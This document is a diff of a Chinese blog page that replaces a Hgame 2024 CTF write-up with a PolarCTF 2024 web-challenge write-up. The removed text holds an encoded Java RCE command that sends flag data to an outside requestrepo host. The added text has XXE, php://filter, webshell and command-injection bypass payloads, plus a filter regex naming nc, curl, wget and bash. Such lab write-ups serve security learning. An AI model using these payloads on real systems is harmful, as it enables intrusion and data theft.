@@ -13,7 +13,7 @@
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
   <title>
     
-      Hgame 2024 week 1 | Infernity&#39;s Blog
+      PolarCTF2024夏季个人挑战赛wp | Infernity&#39;s Blog
     
   </title>
   <meta name="author" content="Infernity">
@@ -100,7 +100,7 @@
 	<!-- Page title -->
 	<p>
 		
-			「Hgame 2024 week 1」
+			「PolarCTF2024夏季个人挑战赛wp」
 		
 	</p>
 
@@ -246,8 +246,8 @@
 	<div id="layout-post">
 		<div class="article-title">
 			
-	<a href="/2024/01/31/Hgame%202024%20week%201/" itemprop="url">
-		Hgame 2024 week 1
+	<a href="/2024/06/10/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/" itemprop="url">
+		PolarCTF2024夏季个人挑战赛wp
 	</a>
 
 		</div>
@@ -263,9 +263,9 @@
 
 	更新于
 
-	<a href="/2024/01/31/Hgame%202024%20week%201/" itemprop="url">
-		<time datetime="2024-01-31T07:19:35.000Z" itemprop="dateUpdated">
-	  		2024-03-30
+	<a href="/2024/06/10/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/" itemprop="url">
+		<time datetime="2024-06-10T04:05:35.000Z" itemprop="dateUpdated">
+	  		2024-06-18
 	  </time>
 	</a> 
 
@@ -286,7 +286,7 @@
 			
 
 	
-    <span class="leancloud_visitors" id="/2024/01/31/Hgame%202024%20week%201/_visitors" data-url="/2024/01/31/Hgame%202024%20week%201/" data-title="Hgame 2024 week 1">
+    <span class="leancloud_visitors" id="/2024/06/10/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/_visitors" data-url="/2024/06/10/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/" data-title="PolarCTF2024夏季个人挑战赛wp">
        	<i class="icon-eye"></i>
        	热度
         
@@ -298,7 +298,7 @@
 
 
 	
-    <span class="leancloud_likes" id="/2024/01/31/Hgame%202024%20week%201/_likes" data-url="/2024/01/31/Hgame%202024%20week%201/" data-title="Hgame 2024 week 1" rel="unlike">
+    <span class="leancloud_likes" id="/2024/06/10/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/_likes" data-url="/2024/06/10/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/" data-title="PolarCTF2024夏季个人挑战赛wp" rel="unlike">
         <i class="icon-heart"></i>
         喜欢
         <i class="leancloud_likes_count" id="leancloud_likes_count">0</i>
@@ -308,75 +308,93 @@
 		</div>
 
 		<div class="article-content" id="article-content">
-			<p>by:Infernity</p>
-<h1 id="ezHTTP"><a href="#ezHTTP" class="headerlink" title="ezHTTP"></a>ezHTTP</h1><p>请从vidar.club访问这个页面</p>
-<p>在请求头中插入</p>
-<p>referer:vidar.club</p>
-<p>请通过Mozilla&#x2F;5.0 (Vidar; VidarOS x86_64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;121.0.0.0 Safari&#x2F;537.36 Edg&#x2F;121.0.0.0访问此页面</p>
-<p>明显的UA头，修改UA头为以上。</p>
-<p>请从本地访问这个页面</p>
-<p>本地访问不止X-Forwarded-For一个头，有很多种，这里是X-Real-IP:127.0.0.1</p>
-<p>最后拿到一串字符串</p>
-<p>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJGMTRnIjoiaGdhbWV7SFRUUF8hc18xbVAwclQ0bnR9In0.VKMdRQllG61JTReFhmbcfIdq7MvJDncYpjaT7zttEDc</p>
-<p>base64解密后拿到flag</p>
-<p><strong>hgame{HTTP_!s_1mP0rT4nt}</strong></p>
-<p>当然这里不是base64，但是对于拿到flag来说，base64解密已经够了。解密时记得去掉点号。</p>
-<p><img src="/img/Hgame_2024/1.png" alt="图片.png"></p>
-<h1 id="Bypass-it"><a href="#Bypass-it" class="headerlink" title="Bypass it"></a>Bypass it</h1><p>一个登录注册题，但是不让我注册</p>
-<p><img src="/img/Hgame_2024/2.png" alt="图片.png"></p>
-<p>弹窗一看就是JavaScript弄的，但是为了严谨，查看源码，注册那里有个&#x2F;register_page.php</p>
-<p><img src="/img/Hgame_2024/3.png" alt="图片.png"></p>
-<p>点进去发现这样一段代码</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&#x27;javascript&#x27;</span> defer&gt;<span class="title function_">alert</span>(<span class="string">&#x27;很抱歉，当前不允许注册&#x27;</span>);top.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;login.html&#x27;</span>&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+			<h1 id="扫扫看"><a href="#扫扫看" class="headerlink" title="扫扫看"></a>扫扫看</h1><p>不用扫，猜测是flag.php</p>
+<p><img src="/home/yinyun/Documents/Infernity.github.io/source/_posts/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp.assets/image-20240610123154816.png" alt="image-20240610123154816"></p>
+<blockquote>
+<p>flag{094c9cc14068a7d18ccd0dd3606e532f}</p>
+</blockquote>
+<h1 id="debudao"><a href="#debudao" class="headerlink" title="debudao"></a>debudao</h1><p>flag在cookie里：</p>
+<p><img src="/home/yinyun/Documents/Infernity.github.io/source/_posts/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp.assets/image-20240610124209641.png" alt="image-20240610124209641"></p>
+<blockquote>
+<p>flag{72077a55w312584wb1aaa88888cd41af}</p>
+</blockquote>
+<h1 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xxs&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$input</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;xxs&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$input</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;错误：输入类型不允许为数组。&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^0e[0-9]+$/&quot;</span>, <span class="title function_ invoke__">md5</span>(<span class="variable">$input</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;错误：输入的MD5值必须以&#x27;0e&#x27;开头，并跟随数字。&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$input</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;错误：输入必须是数字。&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;恭喜：&quot;</span>.<span class="variable">$flag</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;错误：必须设置正确参数。&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
 
-<p>这段代码是直接弹个窗，然后重定向到Login页面。那么好，直接禁用js就可以了，关于哪个浏览器如何禁用js这里不再赘述。</p>
-<p>禁用后，就可以注册了，注册后退回到login界面，登录后一片白，但是看源码发现这里也是通过js重定向到userIndex.php页面，但是我们禁用了JS，这里就不会跳转，那我们就手动跳转入userIndex.php，进去后点击click here 拿到flag</p>
-<p> <strong>hgame{5ca7e8897ddd8913d4d1fcba65e55acf7cfa8827}</strong></p>
-<h1 id="SeleSelect-Courses"><a href="#SeleSelect-Courses" class="headerlink" title="SeleSelect Courses"></a><strong>SeleSelect Courses</strong></h1><p>这道题我不知道是哪来的什么提示或者是在考啥。进入后抓取选课的包，重复发同一个包<strong>几千遍</strong>，就会有一次选上，重复这个流程，直到五个都被选上，我这里是用burp发包的，写脚本亦可。</p>
-<p><img src="/img/Hgame_2024/4.png" alt="图片.png"></p>
-<p>五个都选上后拿到flag</p>
-<p><img src="/img/Hgame_2024/5.png" alt="图片.png"></p>
-<p><strong>begin{WELCOMe_to_B3GinCTF_2024_H0Pe_YOU_wiL1_11ke_i7}</strong></p>
-<h1 id="2048-16"><a href="#2048-16" class="headerlink" title="2048*16"></a><strong>2048*16</strong></h1><p>这里首先的难点是我们明知道是JS游戏题，想要去调试，修改变量直接获取胜利，但是这里首先ban掉了F12和鼠标右键，还有ctrl+U这些不让我们看源码和调试，这个是JS做到的，所以我们还是直接禁用JS就可以打开调试工具了。</p>
-<p>新的问题来了，这里JS关闭后，游戏不会正常启动，调试工具倒是打开了，那么这里利用浏览器的性质，打开F12后刷新也会保留F12。所以我们这里再打开JS刷新页面即可。</p>
-<p><img src="/img/Hgame_2024/6.png" alt="图片.png"></p>
-<p>新的问题来了，这里触发了JS反调试，无限debugger，这样是无法调试的，我们需要反 反调试。</p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wxtcstt/article/details/129906561">https://blog.csdn.net/wxtcstt/article/details/129906561</a></p>
-<p>在控制台里按以下方法输入：</p>
-<ol>
-<li>打开F12点击Console</li>
-<li>输入(function(){}).constructor &#x3D;&#x3D;&#x3D; Function，回车；</li>
-<li>如果返回的是true，继续输入Function.prototype.constructor &#x3D; function(){},并回车；</li>
-<li>切换回sources选项卡,点击继续执行，无限debugger的问题就解决了</li>
-</ol>
-<p><img src="/img/Hgame_2024/7.png" alt="图片.png"></p>
-<p>这里第一步我们就解决了，可以调试了，但是这道题把分数变量藏得很深，不能直接通过修改分数来达成目的。</p>
-<p>我们搜索won，把断点打在1207行，这里明显是判断胜负的地方，那么，我们继续故意输掉游戏，让游戏卡在断点处。</p>
-<p><img src="/img/Hgame_2024/8.png" alt="图片.png"></p>
-<p>输掉游戏后，我们逐步跟进</p>
-<p><img src="/img/Hgame_2024/9.png" alt="图片.png"></p>
-<p>差不多五六步之后，出现了这样一个变量</p>
-<p><img src="/img/Hgame_2024/10.png" alt="图片.png"></p>
-<p>很明显了，我们在控制台处输入x&#x3D;true</p>
-<p>然后放开调试，让程序正常运行，拿到flag</p>
-<p><img src="/img/Hgame_2024/11.png" alt="图片.png"></p>
-<p><strong>flag{b99b820f-934d-44d4-93df-41361df7df2d}</strong></p>
-<h1 id="jhat"><a href="#jhat" class="headerlink" title="jhat"></a><strong>jhat</strong></h1><p><strong>提示1</strong>hint1: need rce</p>
-<p><strong>提示2</strong>hint2: focus on oql</p>
-<p><strong>提示3</strong>hint3: 题目不出网 想办法拿到执行结果</p>
-<p>提示已经给的很全面了，打开环境后，进入OQL，即Object Query Language (OQL) query</p>
-<p>然后要在这个框框里打payload进行rce，java题通用的rce payload为</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.lang.Runtime.getRuntime().exec(<span class="string">&quot;payload&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>根据题意，我们需要输入纯数字进去，然后md5加密后是0e+数字的组合。</p>
+<p>240610708的md5加密后是0e462097431906509019562988736854</p>
+<p>所以输入xss&#x3D;240610708即可</p>
+<blockquote>
+<p>flag{1bc29b36f623ba82aaf6724fd3b16718}</p>
+</blockquote>
+<h2 id="upload1"><a href="#upload1" class="headerlink" title="upload1"></a>upload1</h2><p><img src="/home/yinyun/Documents/Infernity.github.io/source/_posts/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp.assets/image-20240610124841926.png" alt="image-20240610124841926"></p>
+<p>是前端检测，抓包传</p>
+<p><img src="/home/yinyun/Documents/Infernity.github.io/source/_posts/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp.assets/image-20240610124951222.png" alt="image-20240610124951222"></p>
+<p>进入123.php post传参：123&#x3D;system(“cat &#x2F;flag.txt”);</p>
+<blockquote>
+<p>flag{adbf5a778175ee757c34d0eba4e932bc}</p>
+</blockquote>
+<h2 id="Dragon"><a href="#Dragon" class="headerlink" title="Dragon"></a>Dragon</h2><p>还是在cookie里，什么了色题？</p>
+<p><img src="/home/yinyun/Documents/Infernity.github.io/source/_posts/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp.assets/image-20240610125659356.png" alt="image-20240610125659356"></p>
+<blockquote>
+<p>flag{72077a551386b19fb1aea77814cd41af}</p>
+</blockquote>
+<h1 id="tnl"><a href="#tnl" class="headerlink" title="tnl"></a>tnl</h1><p>真傻逼，这题目输入3会报sql的错，但是这道题跟sql一点关系也没有，看wp才知道是普通的伪协议读文件他妈的真的</p>
+<p><img src="/home/yinyun/Documents/Infernity.github.io/source/_posts/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp.assets/image-20240610131343532.png" alt="image-20240610131343532"></p>
+<p>我说我怎么输，都会报twothree’的错草</p>
+<p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">@<span class="variable">$file</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;twothree&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>( <span class="title function_ invoke__">strpos</span>( <span class="variable">$file</span>, <span class="string">&quot;1&quot;</span> ) !==  <span class="literal">false</span> || <span class="title function_ invoke__">strpos</span>( <span class="variable">$file</span>, <span class="string">&quot;2&quot;</span> ) !==  <span class="literal">false</span> || <span class="title function_ invoke__">strpos</span>( <span class="variable">$file</span>, <span class="string">&quot;index&quot;</span>))&#123;</span><br><span class="line">		<span class="keyword">include</span> (<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;twothree&#x27;&#x27; at line 1&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>那么题目不出网，老方法，DNSlog外带。该方法在week2里已经写过，这里不再赘述。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.lang.Runtime.getRuntime().exec(<span class="string">&quot;bash -c &#123;echo,Y3VybCBgY2F0IC9mKmAuM2p1c2V2NTUucmVxdWVzdHJlcG8uY29t&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>真傻逼</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">twothree=php://filter/convert.base64-encode/index/resource=flag</span><br></pre></td></tr></table></figure>
 
-<p><img src="/img/Hgame_2024/12.png" alt="图片.png"></p>
-<p><strong>hgame{c000110cc71ea5a1e5b4366597038d8855af5a0f}</strong></p>
+<blockquote>
+<p>flag{29dba9019e40d75a5053b15f4f2906e1}</p>
+</blockquote>
+<h1 id="你知道sys还能这样玩吗"><a href="#你知道sys还能这样玩吗" class="headerlink" title="你知道sys还能这样玩吗"></a>你知道sys还能这样玩吗</h1><p>好家伙，开局403怼脸，来者不善，啥都没给，先猜，结果在sys.php有东西</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget/i&#x27;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>就过滤了普通一些特定组合命令，这里因为直接执行系统命令，可以用bash的做法做，我这里使用变量拼接：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls /</span><br><span class="line">cmd=a=l;b=s;$a$b /;</span><br></pre></td></tr></table></figure>
+
+<p>看到根目录有flag.txt，但是这里把<code>*</code> <code>?</code> <code>.</code>都过滤了，但是中括号还没有，可以用中括号的通配符：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /flag[^a]txt</span><br><span class="line">cmd=a=ca;b=t;c=fla;d=g[^a]txt;$a$b /$c$d;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>flag{196b0f14eba66e10fba74dbf9e99c22f}</p>
+</blockquote>
+<h4 id="法二："><a href="#法二：" class="headerlink" title="法二："></a>法二：</h4><p>利用php -r 执行php代码，编码绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=php -r &#x27;system(hex2bin(&quot;636174202f666c61672e747874&quot;));&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>不用双引号的版本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=php -r &#x27;system(hex2bin(ff3b636174202f666c61672e747874));&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="file:////home/yinyun/.config/QQ/nt_qq_82839f1201706a4c8cdc22423c5b3f9d/nt_data/Pic/2024-06/Ori/def9c1ccf5ba304f9de09359423b6f76.png" alt="img"></p>
+<p><img src="/home/yinyun/Documents/Infernity.github.io/source/_posts/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp.assets/image-20240610141001972.png" alt="image-20240610141001972"></p>
+<h4 id="法三："><a href="#法三：" class="headerlink" title="法三："></a>法三：</h4><p>printf和双引号绕过base64加密</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=`printf &quot;Y2F0IC9mbGFnLnR4dA==&quot;|bas&quot;&quot;e64 -d`</span><br></pre></td></tr></table></figure>
+
+<h4 id="法四："><a href="#法四：" class="headerlink" title="法四："></a>法四：</h4><p>八进制转化</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=$%27\143\141\164%27%3c$%27\57\146\154\141\147\56\164\170\164%27</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="ExX"><a href="#ExX" class="headerlink" title="ExX"></a>ExX</h1><p>扫后台扫到了dom.php</p>
+<p>报错有  DOMDocument::loadXML()</p>
+<p>结合题目名字，猜测是xxe实体注入</p>
+<p>直接上payload</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [ <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=flagggg.php&quot;</span>&gt;</span> ]&gt;</span> <span class="tag">&lt;<span class="name">xml</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;/<span class="name">xml</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/home/yinyun/Documents/Infernity.github.io/source/_posts/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp.assets/image-20240610141823959.png" alt="image-20240610141823959"></p>
+<p>PD9waHANCi8vZmxhZ3s3ZTk3ZThjNGY5ZDZiZTM1YWU4NTAwYjlmYjJjZGQzZX0NCg&#x3D;&#x3D;</p>
+<blockquote>
+<p>flag{7e97e8c4f9d6be35ae8500b9fb2cdd3e}</p>
+</blockquote>
+<p>然后困难部分就全是java了&#x3D;-&#x3D;</p>
+<h1 id="CC链"><a href="#CC链" class="headerlink" title="CC链"></a>CC链</h1><p>cc6链，不出网打内存马</p>
 	
 		</div>
 		
-		<div id="current-post-cover" data-scr="/img/Hgame_2024/HgameCTF2024.png"></div>
+		<div id="current-post-cover" data-scr="/img/PolarCTF2024%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/polarctf.png"></div>
 
 		<!-- relate post, comment...-->
 		<div class="investment-container">
@@ -391,12 +409,8 @@
 	<span>
 		<a id="totop-post-page">返回顶部</a>
 		
-			<a href="/2024/02/05/Begin-CTF-2024/" title="Begin CTF 2024" rel="prev">
-				&laquo;上一篇
-			</a>
 		
-		
-			<a href="/2023/11/28/GeekChallenge%202023%20WEB%E8%B5%9B%E9%A2%98WP/" title="GeekChallenge 2023 WEB赛题目WP" rel="next">
+			<a href="/2024/04/30/PolarCTF2024%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/" title="PolarCTF2024春季个人挑战赛wp" rel="next">
 				下一篇&raquo;
 			</a>
 			
@@ -414,36 +428,6 @@
 <div class="relate-post">
 	
 		<ul>
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2024/06/10/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/" title="PolarCTF2024夏季个人挑战赛wp">
-								PolarCTF2024夏季个人挑战赛wp			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								六月 10日, 2024				
-							</p>
-							<p class="relate-post-content">
-								扫扫看不用扫，猜测是flag.php
-
-
-flag{094c9cc14068a7d18ccd0dd3606e532f}
-
-debudaoflag在cookie里：
-
-
-flag{72077a55w312584wb1aaa88888cd...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2024/06/10/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/" title="PolarCTF2024夏季个人挑战赛wp">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/PolarCTF2024春季个人挑战赛wp/polarctf.png" alt="PolarCTF2024夏季个人挑战赛wp"/>
-							</a>
-						</div>
-					</li>												
 			
 					<li>
 						<div class="relate-post-text">
@@ -672,6 +656,30 @@ https://blog.csdn.net/huangyongkang666/...
 							<a href="/2024/02/17/SICTF-Round3/" title="SICTF Round#3">				
 								
 								<img class="lazy" src="/img/lazy.gif" data-src="/img/background/2.jpg" alt="SICTF Round#3"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/02/17/VNCTF%202024/" title="VNCTF 2024">
+								VNCTF 2024			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								二月 17日, 2024				
+							</p>
+							<p class="relate-post-content">
+								Checkin打转块小游戏奥，直接F12找game.js，里面有这么几行很明显把中间两行放在控制台打出来就好了，
+VNCTF{W31c0m3_t0_VNCTF_2024_g@od_J0B!!!!}
+TrySentthinkphp Se...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/02/17/VNCTF%202024/" title="VNCTF 2024">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/background/27.jpg" alt="VNCTF 2024"/>
 							</a>
 						</div>
 					</li>												
